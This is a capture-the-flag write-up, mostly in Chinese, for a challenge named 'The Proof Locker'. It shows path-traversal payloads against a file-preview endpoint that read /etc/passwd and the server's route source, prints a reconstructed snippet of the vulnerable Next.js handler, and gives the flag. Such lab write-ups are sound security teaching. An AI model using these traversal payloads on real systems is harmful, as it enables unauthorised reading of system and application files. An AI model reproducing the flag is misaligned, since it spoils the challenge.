# The Proof Locker

## 題目描述

Proof files live behind a tidy preview endpoint, but not every path stays where it belongs once the locker door is cracked open.

## 解題思路

這題根據題目以及網頁應該可以判斷這是 LFI，可以在 `http://159.89.237.133/listing/loader-laas` 這個商品頁，每則 review 都有 `Preview raw proof` 連結，點進去以後網址長這樣 `/api/reviews/proof?proof=rat-builder/exploitation_proof.png`，`proof` 參數看起來就是個檔案路徑，直接拿來測穿越

所以話不多說直接開始測，我先試了 `/api/reviews/proof?proof=../flag.txt` 等等的都沒用，最後測了 `/api/reviews/proof?proof=../../../../etc/passwd`，並成功得到 flag

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
nextjs:x:1001:65534::/nonexistent:/usr/sbin/nologin
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

### Fun Fact

在測試的時候我不小心讀取到 `/api/reviews/proof?proof=../../../../app/.next/server/app/api/reviews/proof/route.js`，並看到了所有 flag，以及他的邏輯，我稍微整理後大致如下

```js
const r = searchParams.get("proof");
const t = path.join(process.cwd(), "public", "proofs", r);
// fake etc passwd
const s = path.normalize(t).endsWith(`${path.sep}etc${path.sep}passwd`)
            ? "/tmp/riffhack-etc-passwd"
            : t;
const o = await fs.readFile(s, "utf8");
return new NextResponse(o, ...);
```

可以發現當他偵測到路徑是 `/etc/passwd` 時，會回傳一個假的檔案

## Flag

```text
bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```
